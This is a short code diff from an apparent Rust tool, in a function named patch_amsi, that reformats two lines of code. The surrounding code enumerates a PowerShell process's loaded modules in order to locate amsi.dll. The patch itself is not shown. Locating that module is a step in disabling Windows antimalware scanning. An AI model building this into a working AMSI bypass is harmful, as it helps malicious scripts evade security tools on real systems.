@@ -242,7 +242,14 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
         let mut first_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
         first_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
         Module32First(snap_handle, &mut first_mod as *mut MODULEENTRY32);
-        let _modulname = string_from_array(&mut first_mod.szModule.to_vec().iter().map(|&x| x as u8).collect());
+        let _modulname = string_from_array(
+            &mut first_mod
+                .szModule
+                .to_vec()
+                .iter()
+                .map(|&x| x as u8)
+                .collect(),
+        );
         log::debug!("Module name: {:?}", _modulname);
 
         // Search for the amsi.dll module in the PowerShell process memory
@@ -251,7 +258,14 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
             let mut next_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
             next_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
             let res_next = Module32Next(snap_handle, &mut next_mod as *mut MODULEENTRY32);
-            let next_module = string_from_array(&mut next_mod.szModule.to_vec().iter().map(|&x| x as u8).collect());
+            let next_module = string_from_array(
+                &mut next_mod
+                    .szModule
+                    .to_vec()
+                    .iter()
+                    .map(|&x| x as u8)
+                    .collect(),
+            );
             log::debug!("Next module: {:?}", next_module);
 
             if next_module == "amsi.dll" {
